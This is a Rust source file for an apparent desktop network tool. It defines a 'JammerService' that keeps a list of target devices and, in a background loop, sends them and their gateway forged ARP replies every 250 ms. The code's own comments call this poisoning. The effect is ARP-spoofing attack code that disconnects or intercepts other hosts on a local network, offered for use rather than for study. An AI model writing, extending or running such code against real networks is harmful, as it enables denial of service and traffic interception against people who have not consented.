// src-tauri/src/application/jammer_service.rs

use crate::infrastructure::network::packet_injector::PacketInjector;
use crate::infrastructure::repositories::local_intelligence;
use pnet::datalink;
use pnet::util::MacAddr;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

#[derive(Clone)]
struct Target {
    ip: String,
    mac: String,
    gateway_ip: String,
}

pub struct JammerService {
    active_targets: Arc<Mutex<HashMap<String, Target>>>,
    running: Arc<AtomicBool>,
}

impl JammerService {
    pub fn new() -> Self {
        let service = Self {
            active_targets: Arc::new(Mutex::new(HashMap::new())),
            running: Arc::new(AtomicBool::new(true)),
        };
        service.start_attack_loop();
        service
    }

    fn start_attack_loop(&self) {
        let targets_clone = Arc::clone(&self.active_targets);
        let running_clone = Arc::clone(&self.running);

        thread::spawn(move || {
            while running_clone.load(Ordering::Relaxed) {
                let targets = {
                    let Ok(lock) = targets_clone.lock() else {
                        thread::sleep(Duration::from_millis(200));
                        continue;
                    };
                    if lock.is_empty() {
                        thread::sleep(Duration::from_millis(1000));
                        continue;
                    }
                    lock.clone()
                };

                let identity = match local_intelligence::get_host_identity() {
                    Ok(id) => id,
                    Err(_) => {
                        thread::sleep(Duration::from_millis(500));
                        continue;
                    }
                };

                let interfaces = datalink::interfaces();
                let interface = interfaces.into_iter().find(|iface| {
                    iface.ips.iter().any(|ip| ip.ip().to_string() == identity.ip)
                });

                let Some(iface) = interface else {
                    thread::sleep(Duration::from_millis(500));
                    continue;
                };

                let Some(my_mac) = iface.mac else {
                    thread::sleep(Duration::from_millis(500));
                    continue;
                };

                for (_, target) in &targets {
                    let Ok(target_ip) = Ipv4Addr::from_str(&target.ip) else {
                        continue;
                    };
                    let Ok(gateway_ip) = Ipv4Addr::from_str(&target.gateway_ip) else {
                        continue;
                    };

                    let target_mac = PacketInjector::parse_mac(&target.mac);
                    if target_mac == MacAddr::zero() {
                        continue;
                    }

                    // Enviamos ARP Reply falsificado al objetivo (poisoning).
                    PacketInjector::send_fake_arp(&iface, target_mac, target_ip, my_mac, gateway_ip);

                    // Segundo envio: al gateway, usando broadcast ethernet (best-effort).
                    let broadcast_mac = MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
                    PacketInjector::send_fake_arp(&iface, broadcast_mac, gateway_ip, my_mac, target_ip);
                }

                // Cadencia conservadora para no saturar el host local.
                thread::sleep(Duration::from_millis(250));
            }
        });
    }

    pub fn start_jamming(&self, target_ip: String, target_mac: String, gateway_ip: String) {
        let Ok(mut lock) = self.active_targets.lock() else {
            return;
        };
        println!(
            "💀 [JAMMER] Objetivo registrado: {} (gateway: {})",
            target_ip, gateway_ip
        );
        lock.insert(
            target_ip.clone(),
            Target {
                ip: target_ip,
                mac: target_mac,
                gateway_ip,
            },
        );
    }

    pub fn stop_jamming(&self, target_ip: String) {
        let Ok(mut lock) = self.active_targets.lock() else {
            return;
        };
        if lock.remove(&target_ip).is_some() {
            println!("🏳️ [JAMMER] Objetivo eliminado: {}", target_ip);
        }
    }
}

impl Drop for JammerService {
    fn drop(&mut self) {
        self.running.store(false, Ordering::Relaxed);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn start_jamming_registers_target() {
        let service = JammerService::new();
        service.start_jamming(
            "192.168.1.20".to_string(),
            "AA:BB:CC:DD:EE:20".to_string(),
            "192.168.1.1".to_string(),
        );

        let lock = service.active_targets.lock().unwrap();
        assert_eq!(lock.len(), 1);
        assert!(lock.contains_key("192.168.1.20"));
    }

    #[test]
    fn stop_jamming_removes_target() {
        let service = JammerService::new();
        service.start_jamming(
            "192.168.1.30".to_string(),
            "AA:BB:CC:DD:EE:30".to_string(),
            "192.168.1.1".to_string(),
        );
        service.stop_jamming("192.168.1.30".to_string());

        let lock = service.active_targets.lock().unwrap();
        assert!(lock.is_empty());
    }
}

